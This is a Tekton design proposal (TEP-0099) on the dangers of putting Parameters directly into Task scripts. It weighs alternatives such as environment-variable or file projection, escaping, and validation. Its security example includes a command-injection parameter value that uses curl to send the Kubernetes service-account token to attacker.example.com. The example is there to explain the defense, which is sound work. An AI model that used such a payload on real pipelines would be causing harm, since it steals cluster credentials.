---
status: proposed
title: Parameters in Script
creation-date: '2021-01-05'
last-updated: '2021-01-07'
authors:
- '@jerop'
- '@sbwsg'
---

# TEP-0099: `Parameters` in `Script`

<!-- toc -->
- [Summary](#summary)
- [Motivation](#motivation)
  - [Security](#security)
      - [Example](#example)
  - [Reliability](#reliability)
      - [Example](#example-1)
  - [Goals](#goals)
  - [Use Case](#use-case)
  - [Requirements](#requirements)
- [Alternatives](#alternatives)
  - [1. Implicitly Project <code>Parameters</code> as Environment Variables in <code>Steps</code>](#1-implicitly-project--as-environment-variables-in-)
      - [Discussion](#discussion)
  - [2. Implicitly Project <code>Parameters</code> into the Filesystem of <code>Steps</code>](#2-implicitly-project--into-the-filesystem-of-)
      - [Discussion](#discussion-1)
  - [3. Provide an Escaped Form of <code>Parameters</code> as Tekton Variables for Injection](#3-provide-an-escaped-form-of--as-tekton-variables-for-injection)
      - [Discussion](#discussion-2)
  - [4. Reject <code>Parameters</code> in <code>Script</code> and provide instructions to fix](#4-reject--in--and-provide-instructions-to-fix)
      - [Discussion](#discussion-3)
  - [5. Optionally Project <code>Parameters</code> as Environment Variables in <code>Steps</code>](#5-optionally-project--as-environment-variables-in-)
      - [Discussion](#discussion-4)
  - [6. Optionally Project <code>Parameters</code> as Environment Variables in <code>Steps</code> (Language-Agnostic)](#6-optionally-project--as-environment-variables-in--language-agnostic)
      - [Discussion](#discussion-5)
  - [7. Combine some of the above alternatives](#7-combine-some-of-the-above-alternatives)
      - [Discussion](#discussion-6)
  - [8. Add a <code>projection</code> field to params](#8-add-a-projection-field-to-params)
      - [Discussion](#discussion-7)
- [Open Questions](#open-questions)
- [References](#references)
<!-- /toc -->

This TEP builds on the prior work of many contributors, including but not limited to:

* @bobcatfish
* @coryrc
* @imjasonh
* @mogsie
* @popcor255
* @skaegi

## Summary

Using `Parameter` variables directly in `script` blocks in `Tasks` is a footgun
in two ways:
- **Security**: It is easy for a `Task` _author_ to accidentally introduce a vector
  for code injection and, by contrast, difficult for a `Task` _user_ to verify that
  such an injection can't or hasn't taken place.
- **Reliability**: It is easy for a `Task` _user_ to accidentally pass in a `Parameter`
  with a character that would make the `Script` invalid and fail the `Task`, making
  the `Task` extremely fragile.

To solve the above problems, this TEP aims to:
- Introduce a safe and reliable way to access `Parameter` variables from `Scripts`,
  and update the documentation and *Tekton Catalog* with the new approach.
- By default in v1, prevent implicit interpolating of param values into executable
  contexts unless we can validate that doing so is safe.

## Motivation

*Tekton Pipelines* provides variables used to inject values into the contents of certain
fields, including `Scripts`. The values you can inject come from a range of sources,
including `Parameters`. Interpolating `Parameters` in `Script` presents two main challenges:
**Security** and **Reliability**. In this section, we provide the background information and
expound on the challenges users face when interpolating `Parameters` in `Scripts`.

As [documented][params-vars-docs], this is the syntax of `Parameter` interpolation,
where `<name>` is the name of the `Parameter`:

```yaml
# dot notation
$(params.<name>)
# or bracket notation (wrapping <name> with either single or double quotes):
$(params['<name>'])
$(params["<name>"])
``` 

The mechanism of variable substitution is a string replacement that's performed by the
*Tekton Controller* when a `TaskRun` is executed.

Common examples of user-generated input that could be passed via `Parameter` and
interpolated in a `Script` include:
* Commit messages
* Pull request descriptions and comments
* Image names or registry URLs
* Project or test suites names
* Paths into `Workspaces`

Tekton's own use of `Parameter` variables has evolved to avoid placing them
directly in `Scripts`:
1. Migrated our plumbing repository from using `Parameters` directly
   (e.g.`$(params.foo)`) in `Script` to passing them in through environment variables
   (e.g. `${FOO}`).  This was a precaution against possible code injections to our
   continuous integration:
     * [plumbing-pr-973]
     * [plumbing-pr-974]
     * [plumbing-pr-975]
     * [plumbing-pr-976]
     * [plumbing-pr-977]
2. [Migrated][catalog-pr-711] the `git-clone` Catalog `Task` to use environment variables
   instead of direct `Parameter` injection and, in doing so, made a backwards incompatible
   change to it.
3. Host [guidance in the *Tekton Catalog*][catalog-recommendation] warning against
   `Parameters` in `Scripts`.

Given that we have recognized a flaw in our own usage, it bears exploring whether
this means there are flaws in the tool itself that allow this to occur. The flaws
were previously discussed in [TEP-0017][tep-0017], but we pushed back deciding on
a solution in favor of documenting the existing workarounds. It is time to revisit
the problem and explore a solution considering our:
1. Move towards V1 - decide on path forward ahead of stabilizing the API
1. Change in usage of `Parameters` in `Script` in dogfooding
1. Focus on security, including leaning into secure by default

### Security

It is easy for a `Task` _author_ to accidentally introduce a vector for code
injection and, by contrast, difficult for a `Task` _user_ to verify that such
an injection can't or hasn't taken place.

To audit whether a `Task` is at risk of code injection, a user would need
to determine two things: first whether that `Task` includes a `Parameter`
directly referenced from a `Script` and, if it does, whether that 
`Parameter` was ever populated using untrusted input.

To determine if a `Parameter` could have been populated by untrusted input
the user would need to:
1. read the `Task`
2. read all `Pipelines`, `PipelineRuns` and `Trigger Templates` that
   reference the `Task`
3. trace the values passed to that `Parameter` via those resources
   back to their original source
4. determine if that source could have been user-generated

One security risk is that an attacker can exfiltrate sensitive data, as shown in the
example below. We need to lean into being secure by default to prevent such attacks.

##### Example

A `Task` with a `Step` *foo* interpolates `Parameter` *bar* in its `Script`, as such:

```yaml
  steps:
  - name: foo
    image: myimage
    script: |
      echo $(params.bar)
```

As warned in the [recommendations][catalog-recommendation], an attacker can access the
service account token for the `TaskRun` using `Parameter` *bar* as `$(curl -s
http://attacker.example.com/?value=$(cat/var/run/secrets/kubernetes.io/serviceaccount/token))`.

### Reliability

The interpolation of `Parameters` in `Script` is not aware of context - it is a simple string
replacement. As such, it is easy for a `Task` _User_ to accidentally pass in a `Parameter`
with a character that would make the `Script` invalid and fail the `Task`, making the
`Task` extremely fragile. Characters that can invalidate the `Script` include a space,
a quote sign, and a newline. An example with a quote sign is demonstrated below.
For further details, read the warning in the [recommendations][catalog-recommendation].

##### Example

A `Task` with a `Step` *foo* interpolates `Parameter` *bar* in its `Script`, as such:

```yaml
  steps:
  - name: foo
    image: myimage
    script: |
      echo $(params.bar)
```

A user can pass in `Parameter` *bar* with a single quote. The `Task` would fail because of
the unterminated quote string, instead of echoing the quote string.

### Goals

1. **`Tasks` should safely and reliably access `Parameter` variables from `Scripts`**.

   Replace direct interpolation with an alternative that does not put the `Parameter`
   into an executable context by default.

2. `Tasks` in the *Tekton Catalog* should be bumped to use the safer approach.
    - Given that this update would likely be backwards-incompatible, as it was in the
    [`git-clone` Task update in the Catalog][catalog-pr-711], the versions of those
    `Tasks` have to be bumped with this update, and their previous versions' docs 
     updated to warn about the issue.
    - Catalog `Tasks` that leverage this pattern to intentionally inject executable code
    (e.g. the `git-cli` Task [accepts a script to run as a param][git-cli]) can be updated
    to execute the contents of the `Parameter` from a file or call `eval` on it explicitly.

3. Tekton Pipelines and Catalog documentation should be updated to the new approach.

4. **`Tasks` should not support implicit runtime code injection**.

   Disallow interpolating `Param` values directly into executable
   contexts. If the user wants to execute the contents of a param as a
   script then they should be able to, but it shouldn't be possible
   without "opting in" to that behaviour by calling `eval` or writing
   the value of a param to a script and running it.

### Use Case

As described in the [original proposal][pipeline-issue-781], the use case for `Script`
in `Tasks` is:

> Users need an easy cruft-free way to express a multi-statement `Script` in the
> body of a `Task` `Step`, without having to understand advanced topics about
> `Containers`, like what an `entrypoint` or a `command` is.
>
> Users should only need to have passing familiarity with a shell environment
> to be successful using Tekton.

Problems with variable subsitution was noted in [original proposal][pipeline-issue-781]:

> How this syntax works with input substitutions, e.g., ``${inputs.params.flags}`` might
> also lead to confusion among users, which we should design for.

Users need a way to safely and reliably substitute `Parameters` in `Scripts` in `Steps`
of their `Tasks`. This would make it easier to use Tekton without learning advanced topics,
while still using it reliably and safely.

### Requirements

1. **[Secure by default in v1][secure-by-default]**: Out of the box
   *Tekton Pipelines* v1 should disallow common anti-patterns that
   can render a default install insecure.
1. **Easy to use**: Whatever replaces the direct use of `$(params.X)` in
   `script` should be unsurprising and memorable to ease friction in user
   migration.
1. **Automatable**: A script or program should be able to convert `Tasks`
   to the new approach. This might be impossible for all cases (e.g. if an
   unrecognized shebang has been used in the script) but a best-effort
   implementation should be provided.
1. **Backwards-compatible in v1beta1**. If a user already has `Tasks`
   that use `$(params.X)` syntax in `script` then we should continue supporting
   that usage in v1beta1 resources. Ideally, Tekton Pipelines would warn the user
   about it somehow.
1. **(To be discussed) Provide an escape hatch in v1**. If a cluster
   operator or admin decides that they want to continue allowing
   `Parameter` variables to be directly injectable to `script` fields of
   `Steps` there should be some way for them to configure that.

## Alternatives

### 1. Implicitly Project `Parameters` as Environment Variables in `Steps`

We have projected `Parameters` as environment variables in the `git-clone` Task in the
Catalog and in our own plumbing repository. We can use this approach, and simplify the
syntax by implicitly projecting `Parameters` as environment variables in `Steps`.
The environment variable should be prefixed with `PARAM_` to make it clear and predictable.

```yaml
  # Before
  steps:
  - name: foo
    image: myimage
    script: |
      git clone $(params.url)
  
  # After
  steps:
  - name: foo
    image: myimage
    script: |
      git clone ${PARAM_URL}
      
  # After - Resolved
  steps:
  - name: foo
    image: myimage
    env:
    - name: PARAM_URL
      value: $(params.url)
    script: |
      git clone ${PARAM_URL}
```

##### Discussion

This approach mutates the specification, but it is something we're already doing
with implicit `Parameters` per [TEP-0023][tep-0023].

### 2. Implicitly Project `Parameters` into the Filesystem of `Steps`

Write `Parameters` in files - `/tekton/parameters/<param-name>` - mounted into `Steps`
in the same way that `Results` are supplied. The file path for the param
would be made available via a variable (possibly reusing `$(params.<name>)`.


```yaml
  # Before
  steps:
  - name: foo
    image: myimage
    script: |
      git clone $(params.url)
  
  # After
  steps:
  - name: foo
    image: myimage
    script: |
      IFS='' read -d -r PARAM_URL /tekton/params/url
      git clone ${PARAM_URL}
```

This approach is also under discussion in the context of changing the way `Result`
values are stored in [TEP-0086][tep-0086-alt]. In that proposal a sidecar is
responsible for fetching `Results` from previous `Tasks` and writing them to
a location on disk for use as `Parameters`.

##### Discussion

This approach aligns well with the proposal in [TEP-0086][tep-0086-prop], and
brings consistency in how we supply both `Parameters` and `Results` to `Steps`.

### 3. Provide an Escaped Form of `Parameters` as Tekton Variables for Injection

This was the proposal in [TEP-0017][tep-0017].

> In a Task or Pipeline, for each parameter `foo`, provide `$(params.foo.shell-escaped)`.
>
> This variable shall be escaped according to `printf '%q'` rules as used in bash.
> For example, the literal string `Hello '\!"` becomes `Hello\ \'\\\!\"`. A script
> which ran `echo $(params.foo.shell-escaped)` would print the literal string. The
> escaped value would do the wrong thing when placed inside double or single quotes.

```yaml
  # Before
  steps:
  - name: foo
    image: myimage
    script: |
      git clone $(params.url)
  
  # After
  steps:
  - name: foo
    image: myimage
    script: |
      git clone $(params.url.shell-escaped)
```

##### Discussion

This approach mutates the specification (at the user's request), but it
is something we're already doing with implicit `Parameters` per
[TEP-0023][tep-0023].

Note: while this would be safer than Tekton Pipeline's existing
behaviour our own catalog guidance claims that "no amount of escaping
will be air-tight".

### 4. Reject `Parameters` in `Script` and provide instructions to fix

During validation we could detect `Parameters` used in `Script` blocks and return
a helpful message to the user that they need to rewrite their `Task` to move the
`Parameters` into environment variables.

```yaml
  # Before
  steps:
  - name: foo
    image: myimage
    script: |
      git clone $(params.url)
```

When the Tekton Pipelines Controller sees this `Script` it rejects the `Task` submission
with an error, such as:

```
spec.steps[0].script: $(params.url) cannot be injected into a script, consider moving
into an environment variable on the Step.
```

```yaml
  # After
  steps:
  - name: foo
    image: myimage
    env:
    - name: PARAM_URL
      value: $(params.url)
    script: |
      git clone "${PARAM_URL}"
```

##### Discussion

Non-mutating but doesn't help the user as directly as mutating the spec.

### 5. Optionally Project `Parameters` as Environment Variables in `Steps`

Building on the first alternative above, another approach would be to make
the implicit projection optional, where it only applies to a subset of
`Parameters` with the suffix `env`.

```yaml
  # Before
  steps:
  - name: foo
    image: myimage
    script: |
      git clone $(params.url)
  
  # After
  steps:
  - name: foo
    image: myimage
    script: |
      git clone $(params.url.env)
      
  # After - Resolved
  steps:
  - name: foo
    image: myimage
    env:
    - name: PARAM_URL
      value: $(params.url)
    script: |
      git clone ${PARAM_URL}
```

##### Discussion

This approach is flexible: provide a safer and more reliable interpolation while
still allowing code injection if needed. Even more, it is backwards compatible.
However, the string replacement in `Script` would only work for shell scripts.

### 6. Optionally Project `Parameters` as Environment Variables in `Steps` (Language-Agnostic)

Building on Alternative 6, the `params.foo.env` variable could
expand into `PARAM_FOO`, without the shell-specific braces `${}`. The
user would then be required to look up the env var using their script
language's tools (e.g. `os.getenv` in python, `process.env.X` in node,
`${}` in shell).

```yaml
  # Before
  steps:
  - name: foo
    image: myimage
    script: |
      git clone $(params.url)
  
  # After
  steps:
  - name: foo
    image: myimage
    script: |
      # note here that the param must be double-wrapped,
      # once for tekton in $() and again for shell ${}
      git clone ${$(params.url.env)}
      
  # After - Resolved
  steps:
  - name: foo
    image: myimage
    env:
    - name: PARAM_URL
      value: $(params.url)
    script: |
      git clone ${PARAM_URL}
```

##### Discussion

This alternative has similar properties to 5 but removes the constraint
of being shell-only. Unfortunately it also loses the backwards-compatibility.

### 7. Combine some of the above alternatives

Building on alternatives 1, 2 and 5 Tekton Pipelines could offer an
explicit option to the user whether to project as env or file.

```yaml
  # Before
  steps:
  - name: foo
    image: myimage
    script: |
      git clone $(params.url)
  
  # After
  steps:
  - name: foo
    image: myimage
    script: |
      git clone ${$(params.url1.env)}
      git clone $(params.url2.path)
      
  # After - Resolved
  steps:
  - name: foo
    image: myimage
    env:
    - name: PARAM_URL1
      value: $(params.url1)
    script: |
      git clone ${PARAM_URL1}
      IFS='' read -d -r PARAM_URL2 /tekton/params/url2
      git clone ${PARAM_URL2}
```

##### Discussion

Similar to the other options this mutates the spec, though does so at the user's
discretion. This alternative could be an extension of 5 and support for
the filesystem (`$(params.bar.path)`) could be added later if needed.

### 8. Add a `projection` field to params

Users add a `projection` field to their params that tells Tekton
Pipelines how to expose the `param` value to `Steps`.

```yaml
params:
- name: url1
  projection: env
- name: url2
  projection: file
steps:
- script: |
  git clone "${PARAM_URL1}"
  IFS='' read -d -r PARAM_URL2 $(params.url2.path)
  git clone "${PARAM_URL2}"
```

##### Discussion

This approach makes clear in the `param` definition how the value will
be exposed to the `Step` container. It doesn't exactly match existing
behaviour - in this approach all params are exposed to all steps.
Pipeline's current behaviour is to limit exposing param values to only
those steps that use the values for something.

## Open Questions

1. Is it sufficient to address `Parameters` in `Script` only, or do we need to
   consider all variables that can be substituted in `Script`?
1. Which alternative do we prefer to go forward with?

## References

* Issues:
  * [pipeline-issue-3226]
  * [triggers-issue-675]
* [Catalog Guidance to Avoid Using `Parameters` in `Script` Blocks][catalog-recommendation]
* Recent changes to the *Tekton Plumbing* to remove `$(params)` syntax from `script` blocks:
  * [plumbing-pr-973]
  * [plumbing-pr-974]
  * [plumbing-pr-975]
  * [plumbing-pr-976]
  * [plumbing-pr-977]
* [Change to `git-clone` Catalog Task to remove param injection][catalog-pr-711]
* Tekton Enhancement Proposals:
  * [TEP-0017: Shell-Escaped Parameters][tep-0017]
  * [TEP-0023: Implicit Parameters][tep-0023]

[catalog-recommendation]: https://github.com/tektoncd/catalog/blob/main/recommendations.md#dont-use-interpolation-in-scripts-or-string-arguments
[git-cli]: https://github.com/tektoncd/catalog/blob/4f365ec668973abe3c2df87323b3b7e4bd4a614a/task/git-cli/0.3/git-cli.yaml#L137
[catalog-pr-711]: https://github.com/tektoncd/catalog/pull/711
[plumbing-pr-973]: https://github.com/tektoncd/plumbing/pull/973
[plumbing-pr-974]: https://github.com/tektoncd/plumbing/pull/974
[plumbing-pr-975]: https://github.com/tektoncd/plumbing/pull/975
[plumbing-pr-976]: https://github.com/tektoncd/plumbing/pull/976
[plumbing-pr-977]: https://github.com/tektoncd/plumbing/pull/977
[secure-by-default]: https://en.wikipedia.org/wiki/Secure_by_default
[params-vars-docs]: https://github.com/tektoncd/pipeline/blob/main/docs/tasks.md#substituting-parameters-and-resources
[tep-0086-alt]: https://github.com/tektoncd/community/pull/521/files#diff-6057e05e8be034edde14ed71128372a35468e25c3f6c9809be8cc8a1e78ada94R287
[tep-0086-prop]: https://github.com/tektoncd/community/pull/521/files#diff-6057e05e8be034edde14ed71128372a35468e25c3f6c9809be8cc8a1e78ada94R275
[pipeline-issue-781]: https://github.com/tektoncd/pipeline/issues/781
[tep-0017]: https://github.com/tektoncd/community/pull/208
[tep-0023]: https://github.com/tektoncd/community/blob/main/teps/0023-implicit-mapping.md
[triggers-issue-675]: https://github.com/tektoncd/triggers/issues/675
[pipeline-issue-3226]: https://github.com/tektoncd/pipeline/issues/3226
[templating-doc]: https://docs.google.com/document/d/1h_3vSApIsuiwGkrqSiegi4NVaYG4oVzBquGAhIN6qGM/edit?usp=sharing
